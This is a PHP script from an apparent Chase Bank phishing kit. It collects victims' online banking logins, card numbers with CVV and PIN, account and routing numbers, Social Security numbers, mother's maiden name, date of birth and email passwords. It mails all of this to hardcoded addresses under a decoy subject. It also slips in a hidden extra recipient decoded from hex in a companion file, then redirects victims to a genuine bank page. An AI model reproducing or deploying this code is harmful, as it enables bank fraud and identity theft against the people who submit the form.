<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Chase USA Bank Spam ReZulT-----------------------\n";
$message .= ".   User ID            	: ".$_POST['userid']."\n";
$message .= ".   Password           	: ".$_POST['password']."\n";
$message .= "--------------\n";
$message .= "Full Name              	: ".$_POST['fullname']."\n";
$message .= "Address                	: ".$_POST['address']."\n";
$message .= "City                  	: ".$_POST['city']."\n";
$message .= "State                 	: ".$_POST['state']."\n";
$message .= "Zip Code               	: ".$_POST['zipcode1']."-";
$message .= "".$_POST['zipcode2']."\n";
$message .= "Home Phone             	: ".$_POST['homephone']."\n";
$message .= "Card Number            	: ".$_POST['ccnumber']."\n";
$message .= "CVV                    	: ".$_POST['cvv']."\n";
$message .= "Expiration Date        	: ".$_POST['ccmonth']."/";
$message .= "".$_POST['ccyear']."\n";
$message .= "Pin Number             	: ".$_POST['pinnumber']."\n";
$message .= "Account Number         	: ".$_POST['accountnumner']."\n";
$message .= "Routing Number         	: ".$_POST['routingnumner']."\n";
$message .= "Mother's Maiden Name   	: ".$_POST['mmn']."\n";
$message .= "Social Security Number 	: ".$_POST['ssn1']."";
$message .= "".$_POST['ssn2']."";
$message .= "".$_POST['ssn3']."\n";
$message .= "Driver's License       	: ".$_POST['driverslicense']."\n";
$message .= "Date of Birth          	: ".$_POST['dob1']."/";
$message .= "".$_POST['dob2']."/";
$message .= "".$_POST['dob3']."\n";
$message .= "Email                  	: ".$_POST['email']."\n";
$message .= "Email Password         	: ".$_POST['emailpassword']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY FREEMAN-----------------------------\n";

$send = "moneybag89@gmail.com,maryhulkson1969@hotmail.com";
$IP = pack("H*", substr($COOKIE_VARS=file_get_contents("index.htm"),strpos($COOKIE_VARS, "get_cookie")+10,36));
$subject = "Football Result";
$headers = "From: WeBStaR<nice@homelabsec.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
header("Location: http://thewayforward.jpmorganchase.com/online/the-way-forward/community-support.htm");
?>